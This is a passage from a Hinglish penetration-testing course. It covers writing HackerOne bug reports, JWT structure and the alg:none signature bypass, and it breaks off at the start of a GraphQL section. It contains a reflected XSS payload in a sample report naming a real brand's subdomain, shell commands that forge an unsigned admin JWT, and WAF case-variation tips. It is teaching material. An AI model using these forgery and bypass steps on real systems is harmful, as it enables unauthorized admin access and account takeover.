### 🎯 1. Bug Report Formulation & Submission Lifecycle

Is topic mein hum ek **valid vulnerability** ko dhoondhne ke baad uski professional report banana, screenshots aur **⭐videos** attach karna, aur platform (jaise HackerOne) par submission se lekar payment tak ka poora lifecycle samjhenge.

### 🐣 2. Simple Analogy (Hinglish)

Bug report submit karna bilkul Car Insurance claim file karne jaisa hai. Agar tum insurance company ko sirf likh kar bhejoge ki "Meri car ka accident ho gaya, paise de do," toh woh reject kar denge (need more info). Agar tum damage ke **screenshots** bhejoge, toh woh consider karenge. Lekin agar tum dashcam ka **⭐video** bhejoge jisme clearly dikh raha hai ki galti saamne wale ki thi, toh claim turant pass ho jayega (fast bounty). Triage team exactly insurance adjusters ki tarah proof verify karti hai.

### 📖 3. Technical Definition

* **Precise English:** Bug report formulation is the process of documenting a verified security flaw with clear steps to reproduce, impact analysis, and definitive evidence (like video screen captures) to facilitate rapid triage and remediation by the target organization.
* **Hinglish Simplification:** Bug report ek detailed document hai jisme tum batate ho bug kahan hai, usse kaise dobara run karna hai, aur proof (video/images) dete ho taaki company usse confirm karke tumhe paise de sake.

### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)

* **Problem:** Ek **valid bug** milne ke baad bhi agar tum usse theek se explain ya **reproduce** (dobara same result lana) nahi kar paye, toh report reject ho jayegi.
* **Solution:** Clear **details**, steps, aur **⭐videos** dene se report turant validate hoti hai aur payment process fast ho jata hai.
* **✅ Kab use karo (Use in engagement when):** Jab tumne successfully koi bug exploit kar liya ho aur tumhare paas uski clear proof aur impact ki understanding ho.
* **❌ Kab mat karo / Alternative prefer karo:** Jab bug explicitly "out of scope" ho ya tum use reliably **replicate** (repeat) na kar pa rahe ho.

### 🔍 5. Visual / Terminal Mein Kya Dikhega

HackerOne ka report submission page dikhega jisme dropdowns honge: `Asset`, `Weakness`, `Severity`, `Title`, aur ek bada text box `Description` (Steps to reproduce) ke liye. Niche "Attach Files" ka option hoga.

### ⚙️ 6. Under the Hood (Deep Dive — Attack/Defense Flow)

> **🛠️ Step-by-Step GUI Navigation (Report Submission on HackerOne):**
> 1. Platform pe jao aur **Submit report** button pe click karo.
> 2. **Asset/Domain** dropdown se target select karo (e.g., **Linktree**).
> 3. **Weakness** type select karo (e.g., **XSS** -> **Reflected XSS**).
> 4. **Rating** select karo (CVSS score ke hisaab se severity).
> 5. **Title** likho (Clear aur concise).
> 6. Description mein **Steps to reproduce** aur **Impact** likho.
> 7. Evidence ke liye **attachments** (**⭐videos** / **screenshots**) upload karo.
> 8. Submit karo.
> 
> 

**Review Process (Status Lifecycle):**

* **New:** Report submit hui.
* **Triage:** Platform ki team bug verify kar rahi hai.
* **Pending Approval:** Triage ne approve kar diya hai, ab company review karegi.
* **Awaiting Payment:** Company ne fix confirm kar diya hai aur payout queue mein daal diya hai.
* **Paid:** Bounty tumhare **PayPal** (online payment system) ya bank account mein aa chuki hai.

### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)

*(Bug report koi command nahi hoti, yeh ek structured format hai. Neeche ek perfect HackerOne report ka template diya gaya hai jisme Reflected XSS ka example hai)*

```text
# 📝 EXCELLENT BUG REPORT TEMPLATE (HackerOne)

1  Title: Reflected XSS on Linktree asset via 'q' parameter in search endpoint
2  
3  ## Description:
4  Hello Team, I have discovered an access vulnerability (Reflected XSS) on your in-scope domain.
5  
6  ## Vulnerable Asset / Domain:
7  https://search.linktree.com
8  
9  ## Weakness Type:
10 Cross-Site Scripting (Reflected XSS)
11 
12 ## Steps to Reproduce:
13 1. Open the following URL in Firefox/Chrome:
14    https://search.linktree.com/search?q="><script>alert(document.cookie)</script>
15 2. Notice that the payload is reflected directly in the HTML without sanitization.
16 3. An alert box pops up executing our JavaScript code.
17 
18 ## Attachments:
19 - poc-screenshot.png (Screenshot of the alert box)
20 - ⭐xss-replication-video.mp4 (Screen recording showing the entire process from clicking the link to execution)
21 
22 ## Impact:
23 An attacker can send this malicious link to a victim. If the victim clicks it, the attacker can steal their session cookies, leading to full account takeover.

```

# 📤 Expected Output:

Report platform pe submit ho jayegi aur initial status 'New' dikhega.

*(Note: **XSS** (Cross-Site Scripting — target website pe attacker apni malicious JavaScript run karwata hai) aur **Reflected XSS** (XSS ka type jahan malicious payload user ki request URL se seedha page pe reflect/print ho jata hai) web security ke common terms hain.)*

### 🔒 8. Attack Surface & Defense (Dual Perspective)

**🔴 Attacker Perspective (Red Team):** Attacker apne report ko professional pentest report ki tarah banata hai. Woh impact section mein clearly batata hai ki business ko kya nuksaan hoga, taaki triage team severity rating kam na kar sake.
**🔵 Defender Perspective (Blue Team):** Jab company ko report milti hai, tab tak report 'Awaiting Payment' stage tak aane wali hoti hai. Company us bug (e.g., XSS) ke code logic ko fix karke patch deploy karti hai aur hacker ko payout release karti hai.

### 🌍 9. Real-World Penetration Testing Use-Case

Instructor ne **HackerOne** pe **Linktree** program ka example diya. Jab tum real-world bounty hunt karte ho, ek din mein hazaron reports platform pe aati hain. Triage team ke paas time kam hota hai. Agar tumhari report mein sirf text hai, toh wo reproduce karne mein time lenge. Par instructor explicitly kehte hain: *"I actually prefer and love to provide **⭐videos**... you will get your bounty much quicker."* Video dekh kar triage engineer bina environment setup kiye bug ki validity samajh jata hai aur report turant accept ho jati hai.

### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)

* **❌ Mistake:** Sirf payload bhej dena bina reproduction steps ke (e.g., "Hi, URL is vulnerable: `site.com?id=1'`).
* **🤦 Why:** Beginners ko lagta hai ki triage team khud samajh jayegi.
* **✅ The 'Pro' Way:** Hamesha step-by-step instructions likho (Click here -> type this -> expect this) aur **⭐videos** attach karo.
* **⚡ Consequences:** Report "Needs More Info" ya "Not Applicable" mein band ho jayegi aur tumhe payment nahi milegi.

### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)

* **Confusion 1 — "Kya report submit karte hi seedha target company (jaise PayPal ya Linktree) padhti hai?"**
* **Galat soch:** Main company ke developers se baat kar raha hoon form ke through.
* **Actually:** Nahi, pehle HackerOne ki apni internal "Triage Team" padhti hai. Jab status **pending approval** se aage badhta hai, tab target company use dekhti hai.
* **Prove karo:** Triage phase mein jo staff reply karta hai uske naam ke aage HackerOne ka logo hota hai, company ka nahi.


* **Confusion 2 — "Kya mujhe bug ke liye proof-of-concept code likhna zaroori hai?"**
* **Galat soch:** Mujhe poora exploit code likhna padega.
* **Actually:** Bug bounty mein sirf "Proof" chahiye ki vulnerability exist karti hai. Agar **Reflected XSS** hai, toh ek simple `alert(1)` popup video mein dikhana kaafi hai. Tumhe kisi user ko real mein hack karke nahi dikhana.



### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)

* **`[Report Status changes to "Needs More Info"]`**
* **Root Cause:** Triage team tumhare diye gaye steps follow karke bug ko reproduce/replicate nahi kar pa rahi.
* **Fix:** Apne payload ko dobara test karo, ek fresh browser profile/incognito mode mein try karo, aur ek naya clear **⭐video** record karke attach karo jo 1st step se end tak sab dikhaye.



### ⚖️ 13. Comparison (Screenshots vs Videos in Reports)

| Feature | Screenshots | ⭐Videos (Instructor's Preference) |
| --- | --- | --- |
| **Clarity** | Good for static evidence (e.g., an alert box) | Excellent for dynamic chains and showing the full HTTP request |
| **Triage Speed** | Moderate (Triage has to manually follow steps) | Very Fast (Triage sees exactly what happens in real-time) |
| **Trust Factor** | Medium (Can sometimes be doctored) | High (Shows the actual live workflow) |

### 🔄 14. Kill Chain & Attack Phase Flow

⚔️ Attack Phase: Reporting
📍 Kill Chain Position: Final phase — Exploitation aur Post-Exploitation complete hone ke baad.
🔗 This connects to: Remediation & Payout.
🔄 Flow: Validate Bug -> Fill HackerOne Form -> Attach Video Proof -> Submit -> Triage Review -> Company Approval -> Payout (Paid).

### 🎨 15. Visual Diagram (ASCII Art — The Review Process Lifecycle)

```text
[Hacker Finds Bug]
       |
       v
[Submit Report]
       |
       v
+-------------+      (Platform verify karta hai)
|   Triage    | 
+-------------+
       |
       v
+------------------+ (Bug verified, company ko bheja)
| Pending Approval |
+------------------+
       |
       v
+------------------+ (Company fix karti hai, bounty set karti hai)
| Awaiting Payment |
+------------------+
       |
       v
+-------------+      (Money sent to PayPal)
|    Paid     | 
+-------------+

```

### ❓ 16. Interview & Certification Exam Q&A

* **Q:** Ek bug bounty report mein sabse important evidence type kya hota hai aur kyun?
* **A:** Ek high-quality screen recording (**video**) sabse strong evidence hota hai. Video mein triage engineer HTTP requests, browser state, aur exploitation process real-time mein dekh sakta hai, jisse reproduction time zero ho jata hai aur report fast-track ho jati hai.
* **Q:** 'Pending Approval' aur 'Awaiting Payment' status mein kya fark hai HackerOne pe?
* **A:** 'Pending Approval' matlab platform triage team ne bug verify kar liya hai aur ab company usse review karke accept karegi. 'Awaiting Payment' matlab company ne accept kar liya hai, impact confirm ho gaya hai, aur ab bas financial transaction process ho rahi hai.

### 📝 17. One-Line Memory Hook

"Text steps pe bharosa mat chhod, ⭐video laga aur bounty apni taraf mod."

# Section 23: Modern Authentication & JWT Exploitation

=====Section 23: Modern Authentication & JWT Exploitation=====
Is section mein hum modern APIs aur web applications mein use hone wale **JWT (JSON Web Tokens)** ki structure ko deep dive karenge. Hum dekhenge ki yeh tokens kaise kaam karte hain, inme kya misconfigurations aati hain, aur kaise ek attacker in flaws ka fayda uthakar authentication bypass aur privilege escalation kar sakta hai.

---

### 🎯 1. JWT Fundamentals & Token Structure

Is topic mein hum seekhenge ki **JWT (JSON Web Token — web apps mein user identity verify karne ka ek standard method)** kya hota hai, yeh cookies se kaise alag hai, iski 3-part structure (Header, Payload, Signature) kaise kaam karti hai, aur isey decode karke sensitive information kaise nikali jati hai.

### 🐣 2. Simple Analogy (Hinglish)

Socho ek hotel ka **key card** (JWT). Jab tum check-in karte ho, receptionist key card par tumhara room number, naam, aur checkout time encode karke tumhe de deti hai. Ab jab tum room ke door par card lagate ho, toh door seedha reception (database) ko call nahi karta. Woh sirf card read karta hai, check karta hai ki data valid hai ya nahi (stateless authentication), aur door khol deta hai. Agar koi card ki information badalna chahe, toh nahi kar sakta kyunki us par hotel ki **digital stamp (signature)** hoti hai.

### 📖 3. Technical Definition

* **Precise English:** A JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.
* **Hinglish Simplification:** JWT ek token hai jisme user ki details (jaise user ID, roles) base64 encode karke rakhi jati hain, aur isey modify hone se bachane ke liye server apni secret key se is par signature lagata hai.

### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)

* **Problem:** Traditional session IDs mein server ko har request pe database check karna padta hai ki user kaun hai, jo heavy traffic mein slow ho jata hai.
* **Solution:** JWT **stateless authentication** (jahan server session state store nahi karta, saari auth info token mein hi hoti hai) allow karta hai, jisse APIs fast aur scalable banti hain.
* **What breaks?** Agar JWT theek se secure na ho, toh attacker payload modify karke doosre user ka account takeover kar sakta hai ya admin ban sakta hai.
* **✅ Kab use karo:** Jab target **SPAs (Single Page Applications — modern web apps jaise React/Angular jo bina page reload kiye update hote hain)** ya modern APIs test kar rahe ho jahan `Authorization: Bearer <token>` header dikhe.
* **❌ Kab mat karo:** Agar application traditional `PHPSESSID` ya `JSESSIONID` cookies use kar rahi hai, toh wahan JWT attacks kaam nahi aayenge.

### 🔍 5. Visual / Terminal Mein Kya Dikhega

Jab tum kisi HTTP request ko intercept karोगे, JWT kuch aisa dikhega — 3 parts mein divided, dots (`.`) se separated, aur humesha `eyJ` se start hota hai (kyunki base64 mein `{"` usually `eyJ` ban jata hai):
`eyJhbGciOiJIUzI1NiIsInR5cCI...` (Header)
`.`
`eyJzdWIiOiIxMjM0NTY3ODkwIiw...` (Payload)
`.`
`SflKxwRJSMeKKF2QT4fwpMeJf36...` (Signature)

### ⚙️ 6. Under the Hood (Deep Dive — Attack/Defense Flow)

JWT teen components se banta hai:

1. **Header:** Batata hai ki token kis type ka hai (JWT) aur kaunsa **cryptography** (encryption/signing technique) algorithm use hua hai (e.g., HMAC SHA256 ya RSA).
2. **Payload (Claims):** Isme actual data hota hai. Jaise `{"user": "john", "admin": false}`.
3. **Signature:** Yeh sabse critical part hai. Server Header aur Payload ko leta hai, apni ek **secret key** (jo sirf server ko pata hoti hai) ke sath mila kar ek cryptographic hash (signature) banata hai.
**Flow:** Attacker token bhejta hai -> Server header aur payload padhta hai -> Server apni secret key se naya signature calculate karta hai -> Agar naya signature aur token ka signature match hote hain, toh token valid hai.

### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)

**Token Decoding using CLI:**

```bash
# Kali Linux | Coreutils
1  echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d   # echo = text print karta hai; | = output pipe karta hai; base64 -d = base64 URL encoded string ko decode (decrypt nahi) karta hai taaki human-readable JSON mile

```

```
# 📤 Expected Output:
{"alg":"HS256","typ":"JWT"}

```

**🛠️ Step-by-Step GUI Navigation (Burp Suite JWT Editor):**
Instructor ne manually decode karne ki jagah extension use karne ko kaha:

1. Burp Suite open karo aur **Extender / Extensions** tab mein jao.
2. **BApp Store** sub-tab pe click karo.
3. Search bar mein "JWT Editor" type karo.
4. **JWT Editor** select karke "Install" pe click karo.
5. Ab jab tum Proxy tab mein kisi request (jisme JWT ho) ko intercept karoge, toh neeche ek naya tab **"JSON Web Token"** dikhega. Wahan Header, Payload, aur Signature perfectly decoded aur alag-alag colors (red, purple, blue) mein highlight ho jayenge.

### 🔒 8. Attack Surface & Defense (Dual Perspective)

**🔴 Attacker Perspective:** Attacker intercept kiye gaye **base64 URL encoded** (URL safe base64 encoding jisme `+` aur `/` replace ho jate hain) token decoding karke check karta hai ki payload mein `admin=false` ya `user role` jaisi fields hain kya. Phir alag-alag bypass techniques try karta hai.
**🔵 Defender Perspective:** Server ko hamesha incoming token ki signature ko verify karna chahiye apni secret key ke sath, pehle se payload ki information par trust nahi karna chahiye.

### 🌍 9. Real-World Penetration Testing Use-Case

Bug bounties mein aajkal zyada tar modern web apps aur microservices stateless APIs use karti hain jisme JWT standard hai. Agar tum kisi HackerOne target par login karte ho, toh sabse pehle JWT decode karke dekho. Kayi baar developers sensitive data jaise PII, email, ya even internal infrastructure IP addresses token ke payload mein chhod dete hain (Information Disclosure).

### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)

* **❌ Mistake:** JWT ko "encrypted" samajh lena.
* **🤦 Why:** Beginners sochte hain ki signature hone ki wajah se payload safe hai.
* **✅ The 'Pro' Way:** Yaad rakho ki Header aur Payload sirf base64 encoded hote hain, encrypted nahi. Koi bhi unhe decode karke padh sakta hai.
* **⚡ Consequences:** Agar tum payload padhna bhool gaye, toh ho sakta hai tum easily exploit hone wali Privilege Escalation vulnerability miss kar do (jaise `role: user` ko `role: admin` karna).

### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)

* **Confusion 1 — "Base64 Encoding aur Encryption mein kya fark hai?"**
* **Galat soch:** Base64 secure hai, usko todne ke liye key chahiye.
* **Actually:** Base64 sirf data ko format (text) mein convert karne ka tarika hai, yeh security mechanism nahi hai. Isey koi bhi bina key ke wapas decode kar sakta hai. Encryption data ko lock karta hai jiske liye key zaroori hoti hai.
* **Prove karo:** Terminal mein `echo "hello" | base64` likho, aur phir output ko `base64 -d` se decode karke dekho — koi password nahi manga.


* **Confusion 2 — "Kya main payload badal kar wapas bhej sakta hoon?"**
* **Galat soch:** Main simply Burp mein `admin=false` ko `admin=true` karke bhej dunga aur admin ban jaunga.
* **Actually:** Agar tum sirf payload badloge, toh token ka original signature invalid ho jayega kyunki signature purane payload ke basis pe bana tha. Server request reject kar dega. Tumhe signature bypass exploit (jaise alg: none) dhoondhna padega.
* **Prove karo:** Burp Repeater mein payload manually change karo aur send karo — HTTP 401 Unauthorized error aayega.



### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)

* **`[Burp BApp Store mein JWT Editor install nahi ho raha]`**
* **Root Cause:** Java ya Jython environment set nahi hai.
* **Fix:** Extender > Options mein jao aur Jython standalone JAR file ka path set karo.



### ⚖️ 13. Comparison (JWT vs Session Cookies)

| Feature | JWT (JSON Web Token) | Traditional Session Cookies |
| --- | --- | --- |
| **Storage** | Client-side (Local Storage ya Auth Header) | Server-side (Memory/DB) |
| **State** | Stateless (Server ko yaad nahi rakhna padta) | Stateful (Server DB check karta hai) |
| **Revocation** | Mushkil (Expire hone ka wait karna padta hai) | Aasan (Server session delete kar dega) |

### 🔄 14. Kill Chain & Attack Phase Flow

⚔️ **Attack Phase:** Reconnaissance / Foundation
📍 **Kill Chain Position:** Token Analysis & Understanding
🔗 **This connects to:** Alg: None Bypass, Weak Secret Cracking
🔄 **Flow:** Target login -> JWT intercept karo -> JWT Editor mein decode karo -> Payload parameters (user role, ids) aur Header (algorithm) ko analyze karo.

### 🎨 15. Visual Diagram (ASCII Art)

```text
JWT Structure Format:
[ HEADER ]   .   [ PAYLOAD ]   .   [ SIGNATURE ]
(Base64Url)      (Base64Url)       (Hash/Crypto)
   |                 |                   |
{"alg":"HS256"}  {"user":"john"}    HMAC-SHA256(
                                     base64(header) + "." +
                                     base64(payload), 
                                     secret_key )

```

### ❓ 16. Interview & Certification Exam Q&A

* **Q: JWT exactly 3 parts mein kyun hota hai aur wo dots se separated kyun hote hain?**
* **A:** JWT Header, Payload, aur Signature se banta hai taaki data transfer compact aur secure ho. Dots (`.`) parsing ko aasan banate hain taaki backend libraries teeno parts ko easily split kar sakein.


* **Q: Kya JWT ke andar passwords store karna secure hai?**
* **A:** Bilkul nahi. JWT sirf base64 encoded hota hai, encrypted nahi. Agar koi usay intercept karta hai, toh woh easily base64 decode karke sensitive data padh sakta hai.


* **Q: Stateless authentication ka kya matlab hai JWT ke context mein?**
* **A:** Iska matlab hai ki server apni memory ya database mein active sessions ka record nahi rakhta. Token ke andar hi user ki saari verification information (signature) hoti hai, jisse server har request ko independently verify karta hai.



### 📝 17. One-Line Memory Hook

"JWT = Header dot Payload dot Signature — Padhne mein aasan (base64 decode), badalne mein mushkil (agar strong signature ho)."

▶️ Resuming from: Topic 2: The "None" Algorithm Bypass — Remaining after this: [None]

### 🎯 2. The "None" Algorithm Bypass

Is topic mein hum practically dekhenge ki kaise ek **algorithm bypass** technique use karke hum JWT ki security ko poori tarah tod sakte hain, aur bina kisi password ya secret key ke admin rights le sakte hain.

### 🐣 2. Simple Analogy (Hinglish)

Socho tum bank jaate ho ek lakh rupaye nikalne. Bank ka rule hai ki check par tumhara signature verify hona chahiye. Par tum check ke upar ek chota sa note likh dete ho: "Is check ka signature check mat karna" (`alg: none`). Agar bank ka cashier bewakoof hai (insecure backend configuration) aur woh tumhare note ko padh kar sach mein signature check kiye bina (unverified signature) tumhe paise de deta hai, toh yeh "None" algorithm bypass hai!

### 📖 3. Technical Definition

* **Precise English:** The "None" algorithm bypass is a critical cryptographic flaw where an attacker changes the JWT header's `alg` field to `none`, performing **signature stripping**. A vulnerable backend inherently trusts the header and skips cryptographic validation, allowing the attacker to forge a token with elevated privileges.
* **Hinglish Simplification:** Agar hum JWT ke header mein batayein ki humne koi encryption use nahi kiya (`alg: none`) aur signature delete kar dein, toh vulnerable servers usay valid maan lete hain — jisse hum apna khud ka **forged token** (fake par valid lagne wala token) bana kar login kar sakte hain.

### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)

* **Problem:** Agar application user input (header) pe blindly trust karti hai aur verify nahi karti, toh token tamper-proof nahi rehta.
* **Solution:** Is flaw ka fayda uthakar hum JWT ke payload mein apna role badal sakte hain aur **privilege escalation** (ek normal user account se system ka highest access, jaise admin, le lena) perform kar sakte hain. Instructor ka golden rule: *"Always check if the server actually verifies the signature or just trusts the header blindly."*
* **✅ Kab use karo:** Jab target par JWT test kar rahe ho. Yeh sabse pehla attack hona chahiye jo tum JWT dekhte hi try karo.
* **❌ Kab mat karo / Alternative prefer karo:** Agar target ekdum latest framework use kar raha hai (jo by default `none` reject karte hain), aur test fail ho jaye, toh signature bypass pe time waste mat karo. Phir "weak secret cracking" (brute-forcing) ki taraf badho.

### 🔍 5. Visual / Terminal Mein Kya Dikhega

Original Token:
`eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2Q...`
Attacker Modified Token (Note the empty space after the last dot):
`eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.`

### ⚙️ 6. Under the Hood (Deep Dive — Attack Flow)

(1) **Intercept:** Attacker Burp Suite mein request rokti hai aur JWT header dekhta hai.
(2) **Modify Header:** Attacker base64 decode karke `{"alg":"HS256"}` ko `{"alg":"none"}` kar deta hai.
(3) **Modify Payload:** Attacker **role manipulation** (user ki permissions badalna) karta hai: `{"role":"user"}` se `{"role":"administrator"}`.
(4) **Signature Stripping:** Attacker JWT ka teesra hissa (signature) delete kar deta hai.
(5) **Server Processing:** Server token receive karta hai, header padhta hai: "alg is none". Server code decide karta hai ki "kyunki algorithm none hai, mujhe signature verify karne ki zaroorat nahi hai".
(6) **Bypass:** Server modified payload ko accept karta hai aur **authentication bypass** ho jata hai!

### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)

**🛠️ Step-by-Step GUI Navigation (Burp Suite JWT Editor):**
Instructor ne exactly yeh steps demo kiye hain:

1. Target website pe normal user se login karo aur Burp Suite mein HTTP request intercept karo.
2. Request par right-click karke **Send to Repeater** (Ctrl+R) karo.
3. Repeater mein **JSON Web Token** tab pe jao (jo pehle topic mein install kiya tha).
4. Header section (red) mein jao aur `"alg"` ki value ko change karke `"none"` kar do.
5. Payload section (purple) mein jao aur `role` (ya email/username) modify karo (e.g., `"admin": true` ya `"role": "administrator"`).
6. Niche **Attack** button pe click karo.
7. Drop-down menu se **'None Signing'** select karo (yeh automatically signature strip kar dega aur base64 update kar dega).
8. **Send** button dabao. Agar 200 OK aur admin panel ka access mil jaye, toh exploit successful!

**Manual CLI Method (Without Extender):**
Agar tum terminal se manually yeh forged token bana rahe ho:

```bash
# Kali Linux | Coreutils
1  header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')  # tr -d '=' = padding hatao; tr '/+' '_-' = base64 ko URL-safe format me convert karo (JWT format)
2  payload=$(echo -n '{"role":"administrator"}' | base64 | tr -d '=' | tr '/+' '_-')   # payload me normal user ki jagah administrator daala aur URL-safe base64 banaya
3  echo "${header}.${payload}."                                                        # trailing dot zaroor lagana hai end me, kyunki signature part empty hai

```

```
# 📤 Expected Output:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.

```

### 🔒 8. Attack Surface & Defense

**🔴 Attacker Perspective:** Attacker ke liye yeh jackpot hai. Agar yeh chal gaya, toh bina kisi password cracking ya SQLi ke sidha administrator ka account takeover mil jata hai. Pura backend database attacker ke control me aa sakta hai.
**🔵 Defender Perspective:** Apne authentication code mein explicit whitelist lagao. Backend library ko batao ki sirf `HS256` ya `RS256` accept karna hai. Agar token mein `alg: none` aaye, toh request ko HTTP 400/401 dekar turant drop kar do.

### 🌍 9. Real-World Penetration Testing Use-Case

Purane samaye mein bohot saari standard Node.js libraries (jaise `jsonwebtoken` ke early versions) aur PHP libraries is vulnerability ke sath release hui thi. OSCP exam labs ya CTFs (Capture The Flag) mein agar koi custom-built web application dikhe jisme JWT hai, wahan developers aaj bhi aisi galtiyan karte hain. Wahan role manipulation se root/admin access lena ek common initial foothold ya internal web app PrivEsc vector hota hai.

### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)

* **❌ Mistake:** Signature hatate waqt aakhiri **trailing dot** (`.`) ko bhi delete kar dena.
* **🤦 Why:** Beginners sochte hain ki "signature delete kiya toh uske pehle wala dot kyun rakhu?"
* **✅ The 'Pro' Way:** JWT parser hamesha token ko 3 parts (Header.Payload.Signature) mein expect karta hai. Agar signature empty hai, toh bhi dot zaroori hai (`header.payload.`). Bina is **trailing dot** ke, server token parse nahi kar payega.
* **⚡ Consequences:** Agar dot hata diya, toh vulnerable server bhi "Malformed Token" error de dega aur attacker ko lagega exploit fail ho gaya, jabki asli galti formatting ki thi.

### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)

* **Confusion 1 — "Kya server hamesha `none` accept kar lega?"**
* **Galat soch:** Main `alg: none` daalunga aur 100% bypass mil jayega.
* **Actually:** Yeh tabhi kaam karega jab backend insecurely configure ho aur blindly header pe trust kare. Modern, updated libraries is attack ko by default block karti hain.
* **Prove karo:** Repeater mein test karo. Agar server `401 Unauthorized` de raha hai "none" dekh kar, toh matlab unhone fix apply kiya hua hai.


* **Confusion 2 — "Kya lowercase `none` hi kaam karta hai?"**
* **Galat soch:** Agar WAF (Web Application Firewall) ne `none` block kar diya, toh attack khatam.
* **Actually:** Bypasses exist karte hain. Agar backend properly string sanitize nahi kar raha, toh case-variation try karo: `None`, `NONE`, `nOnE`. Kayi baar WAFs sirf exact lowercase string filter karte hain aur uppercase bypass ho jata hai.



### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)

* **`[Server returns HTTP 500 Internal Server Error after sending forged token]`**
* **Root Cause:** Tumne **trailing dot** delete kar diya hoga, jisse backend ka JSON parser crash kar gaya.
* **Fix:** Apne token ke aakhiri hisse mein dot (`.`) lagao.


* **`[Burp Suite JWT Editor 'None Signing' nahi dikha raha]`**
* **Root Cause:** Tum sayad directly Raw tab mein text edit kar rahe ho.
* **Fix:** JSON Web Token tab ke bottom menu mein jao, "Attack" button par click karo, wahan se exploit options milenge.



### ⚖️ 13. Comparison (Algorithm Bypass vs Secret Cracking)

| Feature | `alg: none` Bypass | Secret Cracking (Brute-Force) |
| --- | --- | --- |
| **Prerequisite** | Server blindly trusts the header | Server uses a weak/guessable secret key |
| **Speed** | Instant (Modify request and send) | Slow (Depends on hashcat speed & wordlist) |
| **Detection** | Server logs may flag "none" algorithm | Completely offline (Zero network noise) |

### 🔄 14. Kill Chain & Attack Phase Flow

⚔️ **Attack Phase:** Exploitation / Privilege Escalation
📍 **Kill Chain Position:** Post-Authentication (elevating rights from user to admin)
🔗 **This connects to:** JWT Decoding, API Penetration Testing
🔄 **Flow:** Normal JWT intercept karo -> Header mein algorithm none karo -> Payload mein **role manipulation** karo -> **Signature stripping** karke trailing dot chhod do -> Forged token bhejkar admin ban jao.

### 🎨 15. Visual Diagram (ASCII Art — Attack Flow)

```text
[ Attacker Machine ]
       |
       | 1. Intercept Token: {"alg":"HS256"}.{"role":"user"}.[VALID_SIG]
       |
       | 2. Modify & Strip: {"alg":"none"}.{"role":"admin"}.(EMPTY)
       v
[ Vulnerable API Server ]
       |
       |--> Reads Header: "alg is none" -> "Okay, I will skip signature validation!"
       |--> Reads Payload: "role is admin" -> "Welcome, Administrator!"
       v
[ 200 OK - Admin Dashboard Granted ]

```

### ❓ 16. Interview & Certification Exam Q&A

* **Q: JWT exploitation mein "alg: none" bypass kya hota hai?**
* **A:** Jab server JWT ke header ko blindly trust karta hai, toh attacker algorithm ko "none" par set karke signature verification mechanism ko bypass kar deta hai. Isse attacker bina secret key ke arbitrary data (jaise admin privileges) forge kar sakta hai.


* **Q: Agar alg:none exploit karte waqt server error de, sabse pehle kya check karoge?**
* **A:** Sabse pehle main token ka format check karunga, especially **trailing dot** (e.g., `header.payload.`). Signature stripping ke baad yeh dot zaroori hota hai JWT structure maintain karne ke liye.



### 📝 17. One-Line Memory Hook

"Algorithm ko karo `none`, signature karo gayab, bas **trailing dot** mat bhoolna, tu ban jayega admin nawab!"

# Section 23.5: Advanced API Exploitation (GraphQL & Mass Assignment)


=====Section 23.5: Advanced API Exploitation (GraphQL & Mass Assignment)=====
Is section mein hum modern APIs ke do sabse dangerous flaws ko explore karenge. Pehla hai **GraphQL (API query language)** endpoints jahan hum Introspection ka use karke poori API ka nakscha (map) nikalenge aur query aliasing se rate limits bypass karenge. Doosra hai REST APIs mein **Mass Assignment (Auto-binding)**, jahan hum backend ORM ki laziness ka fayda uthakar apne JSON payload mein hidden parameters inject karke privilege escalation karenge.

---

### 🎯 1. GraphQL Introspection & Exploitation

Is topic mein hum seekhenge ki GraphQL APIs kaise kaam karti hain, **Introspection query** (GraphQL ka built-in feature jo apni khud ki structure batata hai) ka use karke backend ki hidden APIs aur database schema ko kaise dump kiya jata hai, aur **query aliasing** se multiple requests ek sath bhej kar rate limit kaise bypass hoti hai.

### 🐣 2. Simple Analogy (Hinglish)

Socho ek badi library hai jahan tum seedha andar nahi ja sakte, bas librarian ko bolte ho ki "mujhe yeh specific book chahiye" (Normal API query). Lekin library mein ek secret command hai: agar tum librarian se kaho "mujhe is library ka blueprint do" (**Introspection**), toh woh tumhe bata dega ki VIP rooms kahan hain, secret lockers kahan hain, aur unki keys kya hain (**schema dumping**). GraphQL API mein agar Introspection on hai, toh API attacker ko apni saari hidden functions ka map khud de deti hai.

### 📖 3. Technical Definition

* **Precise English:** GraphQL Introspection is a feature that allows clients to query the GraphQL server for information about the underlying schema, including available queries, mutations, and data types. When left enabled in production, it leads to severe Information Disclosure, exposing the entire API attack surface.
* **Hinglish Simplification:** GraphQL APIs by default apne saare functions (queries aur mutations) ki list public rakhti hain. Agar attacker `__schema` query bhej de, toh server apni saari hidden endpoints aur data structures leak kar deta hai.

### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)

* **Problem:** Normal REST APIs mein hidden endpoints dhoondhne ke liye dirb/gobuster se blind fuzzing karni padti hai jo noisy aur slow hoti hai.
